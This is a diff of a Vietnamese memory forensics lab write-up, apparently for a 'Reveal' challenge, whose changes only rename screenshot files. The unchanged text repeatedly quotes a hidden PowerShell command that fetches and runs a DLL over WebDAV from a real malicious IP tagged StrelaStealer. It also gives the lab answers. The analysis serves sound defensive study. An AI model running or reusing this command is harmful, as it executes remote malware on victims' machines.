@@ -21,7 +21,7 @@ Trong kết quả, `powershell.exe` thực thi command:
 powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
 ```
 
-![Pasted image 20260816142141.png](./images/Pasted%20image%2020260816142141.png)
+![Reveal Lab-1.png](./images/Reveal%20Lab-1.png)
 
 Command line này có nhiều dấu hiệu bất thường. PowerShell được chạy với tùy chọn `-windowstyle hidden` nhằm ẩn cửa sổ khỏi người dùng. Sau đó process truy cập remote WebDAV server tại `45.9.74.32:8888` và sử dụng `rundll32.exe` để thực thi file `3435.dll` trực tiếp từ remote path.
 
@@ -39,7 +39,7 @@ Sử dụng `windows.pstree` hoặc `windows.pslist` để kiểm tra quan hệ 
 ```
 
 Trong đó `3692` là PID của `powershell.exe`, còn `4120` là PPID.
-![Pasted image 20260816120727.png](./images/Pasted%20image%2020260816120727.png)
+![Reveal Lab-2.png](./images/Reveal%20Lab-2.png)
 Một điểm cần lưu ý là ảnh còn cho thấy `wordpad.exe` có PID `9112` và cũng có PPID `4120`. Vì vậy từ artifact hiện có chỉ có thể khẳng định **PPID của PowerShell là 4120**
 
 >4120
@@ -58,7 +58,7 @@ Command line thu được chứa:
 rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
 ```
 
-![Pasted image 20260816120733.png](./images/Pasted%20image%2020260816120733.png)
+![Reveal Lab-3.png](./images/Reveal%20Lab-3.png)
 
 Cú pháp trên cho thấy `rundll32` được sử dụng để load DLL `3435.dll` từ remote WebDAV path và gọi exported function `entry`
 
@@ -78,7 +78,7 @@ sau đó `rundll32` truy cập:
 \\45.9.74.32@8888\davwwwroot\3435.dll
 ```
 
-![Pasted image 20260816120736.png](./images/Pasted%20image%2020260816120736.png)
+![Reveal Lab-4.png](./images/Reveal%20Lab-4.png)
 
 Phần `davwwwroot` là thành phần directory trong UNC path được Windows WebDAV redirector sử dụng để truy cập nội dung trên WebDAV server
 
@@ -94,7 +94,7 @@ rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
 ```
 
 `rundll32.exe` là utility hợp lệ của Windows dùng để load và gọi exported function trong DLL. Khi attacker lạm dụng binary này để proxy execution cho malicious code, hành vi được MITRE ATT&CK mapping vào **System Binary Proxy Execution: Rundll32**
-![Pasted image 20260816140810.png](./images/Pasted%20image%2020260816140810.png)
+![Reveal Lab-5.png](./images/Reveal%20Lab-5.png)
 
 >T1218.011
 
@@ -112,7 +112,7 @@ Plugin này hiển thị các Security Identifier (SID) có trong access token c
 S-1-5-21-3274565340-3808842250-3617890653-1001    Elon
 ```
 
-![Pasted image 20260816120744.png](./images/Pasted%20image%2020260816120744.png)
+![Reveal Lab-6.png](./images/Reveal%20Lab-6.png)
 
 >Elon
 
@@ -132,10 +132,10 @@ http://45.9.74.32:8888/3435.dll
 ```
 được ghi nhận là một malware download URL và được gắn tag `StrelaStealer
 `
-![Pasted image 20260816120748.png](./images/Pasted%20image%2020260816120748.png)
+![Reveal Lab-7.png](./images/Reveal%20Lab-7.png)
 
 Mở entry chi tiết của URL có thể xác nhận host `45.9.74.32` và tag liên quan đến malware family
-![Pasted image 20260816120751.png](./images/Pasted%20image%2020260816120751.png)
+![Reveal Lab-8.png](./images/Reveal%20Lab-8.png)
 
 Kết quả này cũng phù hợp với TTP đã quan sát trong memory: các chiến dịch StrelaStealer từng sử dụng PowerShell để kết nối tới WebDAV server và thực thi DLL thông qua `rundll32`
 
